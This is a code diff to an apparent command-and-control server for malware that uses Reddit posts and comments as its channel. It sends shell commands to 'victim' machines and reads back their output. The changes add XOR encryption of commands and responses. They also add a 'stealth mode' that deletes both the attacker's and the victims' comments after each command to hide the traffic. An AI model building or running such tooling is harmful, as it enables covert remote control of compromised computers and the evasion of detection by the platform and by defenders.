@@ -7,11 +7,18 @@ import json
 import platform
 from prawcore import NotFound
 from praw.models import InlineImage
-from io import BytesIO
+from encryption import *
+import autocomplete
+import readline
 
+comp = autocomplete.Completer()
+# we want to treat '/' as part of a word, so override the delimiters
+readline.set_completer_delims(' \t\n;')
+readline.parse_and_bind("tab: complete")
+readline.set_completer(comp.complete)
 
 #define the host's OS
-hostOS = platform.system()    
+hostOS = platform.system()        
 
 #list all listeners (all post titles in a specific Subreddit)
 def listListeners(subreddit_name):
@@ -57,7 +64,7 @@ def deleteComments(subreddit_name, title):
         for comment in submission.comments:
             if("executed" in comment.body):
                 #delete the replies (victim's posts)
-                for outputTask in top_level_comment.replies:
+                for outputTask in comment.replies:
                     outputTask.delete()
                 #delete the replies (attacker's posts)
                 comment.delete()
@@ -99,7 +106,13 @@ def readOutput(subreddit_name, title, command):
         
         else:
             response = victim_responses[0]
-            print("[+] Received Output:\n" + response[5:])
+            response = response[7:]
+            response = response[:-1]
+            
+            #decode and decrypt the message
+            decipher = decrypt(str(response), xor_key)
+            
+            print("[+] Received Output:\n" + str(decipher))
 
 def sendCommand(subreddit_name, title, command):
     subreddit = reddit.subreddit(subreddit_name)
@@ -107,8 +120,7 @@ def sendCommand(subreddit_name, title, command):
     
     for submission in resp:
         submission.reply("in: " + command)
-    
-    
+        
 
 if __name__ == "__main__":
     #retrieve the data from the configuration file
@@ -120,6 +132,8 @@ if __name__ == "__main__":
     username = data['username']
     password = data['password']
     user_agent = data['user_agent']
+    stealth_mode = data['stealth_mode']
+    xor_key = data['xor_key']
     #-------------
     subreddit_name = ""
     #-------------
@@ -187,12 +201,20 @@ if __name__ == "__main__":
                                 os.system('cls')
                     
                         else:
+                            final_message = encrypt(session_command, xor_key)
+                                          
                             #send the command
-                            sendCommand(subreddit_name, selected_listener, session_command)
+                            sendCommand(subreddit_name, selected_listener, str(final_message))
                             print("[+] Command sent")
                             #then read the output
-                            time.sleep(2) #give time for reddit to update
-                            readOutput(subreddit_name, selected_listener, session_command)
+                            #time.sleep(1) #give time for reddit to update
+                            readOutput(subreddit_name, selected_listener, str(final_message))
+                            #delete the comments if stealth_mode is set to 1 in config.json
+                            if(stealth_mode == "1"):
+                                deleteComments(subreddit_name, selected_listener)
+                            else:
+                                pass
+                                
                         #------------------------ AGENT FEATURES END HERE ------------------------
                 else:
                     print("[!] Could not enter the session")
